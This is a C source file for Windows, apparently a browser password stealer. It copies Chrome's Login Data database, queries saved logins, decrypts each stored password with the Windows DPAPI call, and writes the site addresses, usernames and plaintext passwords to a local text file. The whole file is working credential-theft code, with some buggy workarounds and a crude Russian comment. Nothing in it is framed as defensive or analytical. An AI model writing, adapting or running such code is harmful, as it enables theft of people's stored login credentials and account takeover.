#define _CRT_SECURE_NO_WARNINGS
#pragma comment(lib, "crypt32.lib")

#include <windows.h>
#include <stdio.h>
#include "sqlite3.h"
#include <Lmcons.h>
#include <Shlobj.h>


#define CHROME_APP_DATA_PATH     "\\Google\\Chrome\\User Data\\Default\\Login Data"
#define TEMP_DB_PATH             ".\\chromedb"
#define USER_DATA_QUERY          "SELECT ORIGIN_URL,USERNAME_VALUE,PASSWORD_VALUE FROM LOGINS"
#define SECRET_FILE              ".\\passwords.txt"

FILE *file_with_secrets;
static int row_id = 1;

static int process_row(void *NotUsed, int argc, char **argv, char **azColName);

int main(void)
{
		sqlite3 *logindata_database = NULL; /* represents database where Chrome holds passwords */
		char *err_msg = NULL;
		int result;
		char original_db_location[_MAX_PATH]; /* original location of chrome database */

		memset(original_db_location,0,_MAX_PATH);
		
		SHGetFolderPath(NULL,CSIDL_LOCAL_APPDATA,NULL,0,original_db_location); /* TODO error handling */
		
		strcat(original_db_location,CHROME_APP_DATA_PATH);
		
		/* Copy chrome database (Login Data) to a temporary location due to possible lock */
		result = CopyFile(original_db_location,TEMP_DB_PATH,FALSE); 
		if (!result) {
				fprintf(stderr,"CopyFile() -> Cannot copy original database\n");
				return 1;
		}
		
		result = sqlite3_open(TEMP_DB_PATH, &logindata_database); 
		if (result) {
				fprintf(stderr, "Cannot open database: %s\n", sqlite3_errmsg(logindata_database));
				goto out;
        }
		
		file_with_secrets = fopen(SECRET_FILE,"w+");
		if (!file_with_secrets) {
				fprintf(stderr,"File created failed\n");
				goto out;
		}

		fputs("ORIGIN_URL\t\tUSERNAME_VALUE\t\tPASSWORD_VALUE\n",file_with_secrets);
		
		result = sqlite3_exec(logindata_database,USER_DATA_QUERY,process_row, logindata_database, &err_msg);
        if (result!=SQLITE_OK) 
				fprintf(stderr, "SQL error: %s (%d)\n", err_msg, result);

		sqlite3_free(err_msg);
out:
		sqlite3_close(logindata_database);
		/*
		if(!DeleteFile(TEMP_DB_PATH))
				printf("deletefile sucess!\n");
		else
				printf("deletefile fails\n");	
				*/
		fclose(file_with_secrets);
        return 0;
}

/* 
 * 4th argument of sqlite3_exec is the 1st argument to callback 
 * argc always equals 3, because of our USER_DATA_QUERY 
 * argv[0] = ORIGIN_URL
 * argv[1] = USERNAME_VALUE
 * argv[2] = PASSWORD_VALUE
 */

static int process_row(void *passed_db, int argc, char **argv, char **col_name)
{
		DATA_BLOB encrypted_password;
		DATA_BLOB decrypted_password;
		sqlite3_blob *blob = NULL;
		sqlite3 *db = (sqlite3*)passed_db;
		BYTE *blob_data = NULL;
		char *array;
		int result;
		int blob_size = 0;
		int i;

		fputs(argv[0],file_with_secrets);
		fputs("\t\t",file_with_secrets);
		fputs(argv[1],file_with_secrets);
		fputs("\t\t",file_with_secrets);
		
		if (row_id==3)
				row_id++;/* TODO reinstall chrome | какая-то хуйня с row id случилась, потому и костыль*/

		result = sqlite3_blob_open(db,"main","logins","password_value",row_id,0,&blob);
		if (result!=SQLITE_OK) {
				fprintf(stderr,"sqlite3_blob_open() -> %s\n",sqlite3_errstr(result));
				return 0;
		}
		
		row_id++;
		
		blob_size = sqlite3_blob_bytes(blob);
		blob_data = malloc(blob_size);
		
		result = sqlite3_blob_read(blob, blob_data, blob_size, 0);
		if (result!=SQLITE_OK) {
				fprintf(stderr,"sqlite3_blob_read() -> %s\n",sqlite3_errstr(result));
				return 0;
		}

		encrypted_password.pbData = blob_data;
		encrypted_password.cbData = blob_size;
		
		if(!CryptUnprotectData(&encrypted_password, NULL, NULL, NULL, NULL, 0, &decrypted_password)) {
				fprintf(stderr,"Failed to decrypt blob\n");
				return 0;
		}
		
		array = malloc(decrypted_password.cbData);
		//strncpy(array,(char*)decrypted_password.pbData,decrypted_password.cbData);
		memcpy(array,(char*)decrypted_password.pbData,decrypted_password.cbData);
		
		fputs(array,file_with_secrets);
		fputs("\n",file_with_secrets);
		/*
		for (i = 0; i<decrypted_password.cbData;i++) {
        if(!array[i]){
            continue;
        }
		fputs(array[i],file_with_secrets);
		}         
		fputs("\n",file_with_secrets);
		*/
		LocalFree(decrypted_password.pbData);
		free(blob_data);
		sqlite3_blob_close(blob);
		sqlite3_close(db);
                
        return 0;
}

